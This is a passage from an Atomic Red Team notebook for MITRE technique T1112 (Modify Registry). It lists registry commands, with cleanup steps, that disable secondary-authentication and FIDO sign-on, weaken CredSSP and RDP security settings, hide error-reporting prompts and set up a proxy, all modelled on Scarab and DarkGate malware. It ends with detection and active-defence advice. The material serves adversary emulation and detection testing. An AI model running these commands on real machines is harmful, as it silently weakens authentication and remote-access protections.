    "```command_prompt\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\SecondaryAuthenticationFactor\" /v \"AllowSecondaryAuthenticationDevice\" /t REG_DWORD /d 0 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d534c1c5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 60"
  },
  {
   "cell_type": "markdown",
   "id": "fd1da313",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\SecondaryAuthenticationFactor\" /v \"AllowSecondaryAuthenticationDevice\" /t REG_DWORD /d 1 /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "358342d2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 60 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "af26e09c",
   "metadata": {},
   "source": [
    "### Atomic Test #61 - Activities To Disable Microsoft [FIDO Aka Fast IDentity Online] Authentication Detected By Modified Registry Value.",
    "Detect the Microsoft FIDO authentication disable activities that adversary attempt to gains access to login credentials (e.g., passwords), they may be able to impersonate the user and access sensitive accounts or data and also increases the risk of falling victim to phishing attacks.\nSee the related article (https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.FidoAuthentication::AllowFidoDeviceSignon).\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FIDO\" /v \"AllowExternalDeviceSignon\" /t REG_DWORD /d 0 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "07bd6cde",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 61"
  },
  {
   "cell_type": "markdown",
   "id": "222ae61e",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FIDO\" /v \"AllowExternalDeviceSignon\" /t REG_DWORD /d 1 /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "62cbe182",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 61 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "70e892b4",
   "metadata": {},
   "source": [
    "### Atomic Test #62 - Scarab Ransomware Defense Evasion Activities",
    "Scarab Ransomware defense evasion activities that can abuse the registry values to modify the settings of the Credential Security Support Provider to overcome potential RDP connection issues.\n[Scarab Ransomware Article](https://www.welivesecurity.com/en/eset-research/scarabs-colon-izing-vulnerable-servers/)\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters\" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1a971dca",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 62"
  },
  {
   "cell_type": "markdown",
   "id": "b3c9850b",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters\" /v AllowEncryptionOracle /t REG_DWORD /d 0 /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d85d324f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 62 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "69757702",
   "metadata": {},
   "source": [
    "### Atomic Test #63 - Disable Remote Desktop Anti-Alias Setting Through Registry",
    "A modification registry to disable RDP anti-alias settings. This technique was seen in DarkGate malware as part of its installation\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableRemoteDesktopAntiAlias\" /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "98866f38",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 63"
  },
  {
   "cell_type": "markdown",
   "id": "61ce2924",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableRemoteDesktopAntiAlias\" /t REG_DWORD /d 0 /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4b20877e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 63 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "281f2ddf",
   "metadata": {},
   "source": [
    "### Atomic Test #64 - Disable Remote Desktop Security Settings Through Registry",
    "A modification registry to disable RDP security settings. This technique was seen in DarkGate malware as part of its installation\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableSecuritySettings\" /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3d8daba9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 64"
  },
  {
   "cell_type": "markdown",
   "id": "640ecb17",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableSecuritySettings\" /t REG_DWORD /d 0 /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "58048621",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 64 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "bc7ffc77",
   "metadata": {},
   "source": [
    "### Atomic Test #65 - Disabling ShowUI Settings of Windows Error Reporting (WER)",
    "A modification registry to disable ShowUI settings of Windows Error Report. This registry setting can influence the behavior of error reporting dialogs or prompt box. \nThis technique was seen in DarkGate malware as part of its installation.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting\" /v DontShowUI /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b8714c3a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 65"
  },
  {
   "cell_type": "markdown",
   "id": "13bcbe3b",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg add \"HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting\" /v DontShowUI /t REG_DWORD /d 0 /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c0e321ed",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 65 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d72219a4",
   "metadata": {},
   "source": [
    "### Atomic Test #66 - Enable Proxy Settings",
    "A modification registry to enable proxy settings. This technique was seen in DarkGate malware as part of its installation.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "53efcea9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 66"
  },
  {
   "cell_type": "markdown",
   "id": "e0dc3752",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 0 /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b7a3e7aa",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 66 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "443a38f5",
   "metadata": {},
   "source": [
    "### Atomic Test #67 - Set-Up Proxy Server",
    "A modification registry to setup proxy server. This technique was seen in DarkGate malware as part of its installation.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer /t REG_SZ /d \"proxy.atomic-test.com:8080\" /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c2abb232",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 67"
  },
  {
   "cell_type": "markdown",
   "id": "81a1b995",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "db91c269",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 67 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6ee9dd1f",
   "metadata": {},
   "source": [
    "### Atomic Test #68 - RDP Authentication Level Override",
    "A modification registry to override RDP Authentication Level. This technique was seen in DarkGate malware as part of its installation.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKCU\\Software\\Microsoft\\Terminal Server Client\" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "68b7b79b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 68"
  },
  {
   "cell_type": "markdown",
   "id": "6d5c5332",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKCU\\Software\\Microsoft\\Terminal Server Client\" /v AuthenticationLevelOverride\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a78516cb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 68 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "04e33109",
   "metadata": {},
   "source": "## Detection\nModifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. The Registry may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016)."
  },
  {
   "cell_type": "markdown",
   "id": "f0a5be58",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Baseline \n Identify key system elements to establish a baseline and be prepared to reset a system to that baseline when necessary. \n\n Identify elements of software and configuration critical to a set of objectives, define their proper values, and be prepared to reset a running system to its intended state.  \n#### Opportunity\nThere is an opportunity to utilize known good copies of registry information and restore it if an adversary makes any changes.\n#### Use Case\nA defender can enable Registry Auditing on specific keys to produce an alerts whenever a value is changed and revert those keys to baseline.\n#### Procedures\nMaintain a verified baseline firewall configuration and use that copy as a fallback if an adversary alters that information.\nMaintain a verified list of group policies enforced on a system and use that copy if an adversary attempts to deviate from the baseline.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}